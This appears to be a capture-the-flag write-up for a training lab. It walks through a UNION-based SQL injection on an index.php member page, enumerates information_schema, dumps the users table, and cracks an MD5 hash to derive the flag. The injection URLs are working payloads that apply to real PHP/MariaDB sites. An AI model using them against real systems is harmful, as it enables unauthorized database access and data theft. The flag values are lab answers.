### Now that we find our injection point 


|-- + /index.php?page=member&id=1 UNION SELECT NULL, NULL, NULL;--&Submit=Submit
|   |
|   |- this endpoint retrun 'The used SELECT statements have a different number of columns'
|   |- that mean our injection works but the Union we use doesn't return the same number of columns the first query does
|   
|---+ /index.php?page=member&id=1 UNION SELECT NULL, NULL;--&Submit=Submit
|   |
|   |- testing this there is no error and two rows were returned and  the second one is empty 
|   |- so now we know that the query returns two columns 
|   |- using this query  '/index.php?page=member&id=1 UNION SELECT CHAR(97), CHAR(97) ;'  we know now that the types of the queries returned by the first query are string 
|   |- we used CHAR function in mariadb because the single and double quotes are escaped 
|
|
|---+ /index.php?page=member&id=1 UNION SELECT table_name, TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES;--&Submit=Submit
|   |
|   |- we use this query to get metadata of all tables existing in the current  database 
|   |- here the TABLE_SCHEMA is the name of database where table exists
|   |- table_name is the name of table 
|   |
|
|----+ /index.php?page=member&id=1 UNION SELECT table_schema, CONCAT(table_name,CHAR(124),column_name) FROM information_schema.columns;--&Submit=Submit
|    |
|    |- here a query to list all the columns that exists inside a table and in which database
|    |
|    |
|
|---+ /index.php?page=member&id=1 UNION SELECT NULL, CONCAT(first_name,CHAR(124),last_name,CHAR(124),town,CHAR(124),country,CHAR(124),planet,CHAR(124),Commentaire,CHAR(124),countersign) FROM users;--&Submit=Submit
|   |
|   |- here is this query to get all users columns 
|   |- in the last raw we found th FLAG here is 
|   |- Flag|GetThe|42|42|42|Decrypt this password -> then lower all the char. Sh256 on it and it's good !|5ff9d0165b4f92b14994e5c685cdce28
|
|---+ Getting the Flag
|   |
|   |- after some search we estimate that this hex string 5ff9d0165b4f92b14994e5c685cdce28 is an MD5 when we try to crack it 
|   |- using this website https://hashes.com/en/decrypt/hash we get this 'FortyTwo' -> 'fortytwo'
|   |- then we using SHA-256 on it 
|   |- we got this 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
